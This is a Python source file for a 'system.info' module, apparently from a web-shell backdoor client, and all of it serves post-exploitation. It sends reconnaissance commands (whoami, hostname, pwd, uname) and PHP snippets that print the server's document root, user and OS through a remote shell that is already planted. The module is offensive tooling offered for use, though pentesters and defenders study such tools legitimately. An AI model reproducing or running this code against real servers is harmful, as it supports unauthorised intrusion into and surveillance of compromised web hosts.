'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException

classname = 'Info'
    
class Info(Module):
    """Collect system shell informations
    :system.info all|whoami|hostname|basedir|document_root
    """
    
    vectors = { 
               'shell.sh' : { "whoami"       : "whoami",
                "hostname"     : "hostname",
                "basedir"   : "pwd",
                "uname"     : "uname -a",
                "os"    : "uname"
                },
               
               'shell.php' : { 
                              "document_root" : "@print($_SERVER['DOCUMENT_ROOT']);",
                              "whoami" : "@print(get_current_user());",
                              "hostname" : "@print(gethostname());",
                              "basedir" : "@print(getcwd());",
                              "uname" : "@print(php_uname());",
                              "os" : "@print(PHP_OS);",
                              "script" : "@print($_SERVER['SCRIPT_NAME']);"
                              }
    
    }
    

    def __init__( self, modhandler , url, password):


        Module.__init__(self, modhandler, url, password)
        
        self.infos = {}
        
                
    def run( self, info):
        
        
        if info in self.infos:
            return self.infos[info]
        if info == 'all':
            
            for interpreter in self.vectors:
                for vector in self.vectors[interpreter]:
                    if interpreter in self.modhandler.loaded_shells and not (vector in self.infos):
                        self.infos[vector] = self.modhandler.load(interpreter).run(self.vectors[interpreter][vector])
                
            output=''
            for info in self.infos:
                tabs = '\t'*(3-((len(info)+1)/8))
                output += '%s:%s%s\n' % (info, tabs, self.infos[info])
            return output
        else:
            
            for interpreter in self.vectors:
                for vector in self.vectors[interpreter]:
                    if vector == info and interpreter in self.modhandler.loaded_shells and not vector in self.infos:
                        return self.modhandler.load(interpreter).run(self.vectors[interpreter][vector])
        
         
        raise ModuleException("system.info",  "Information '%s' not supported." % (info))
        



    
    
    